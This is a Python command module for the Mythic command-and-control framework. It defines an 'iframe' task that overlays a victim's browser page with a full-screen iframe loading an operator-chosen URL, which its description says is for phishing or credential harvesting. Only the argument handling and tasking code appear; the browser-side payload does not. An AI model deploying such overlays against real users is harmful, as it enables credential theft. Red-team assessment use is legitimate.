from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *


class IframeArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="url",
                type=ParameterType.String,
                description="URL to display in the full-page overlay iframe",
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise ValueError("Must supply a URL")
        if self.command_line[0] == '{':
            self.load_args_from_json_string(self.command_line)
        else:
            self.add_arg("url", self.command_line)

    async def parse_dictionary(self, dictionary_arguments):
        self.load_args_from_dictionary(dictionary_arguments)


class IframeCommand(CommandBase):
    cmd = "iframe"
    needs_admin = False
    help_cmd = "iframe https://example.com"
    description = "Overlay the current page with a full-screen iframe pointing to the specified URL. Useful for phishing or credential harvesting during assessments."
    version = 1
    author = "@grampae"
    attackmapping = ["T1185"]
    argument_class = IframeArguments
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Browser]
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        url = task.args.get_arg("url")
        task.display_params = url
        return task

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
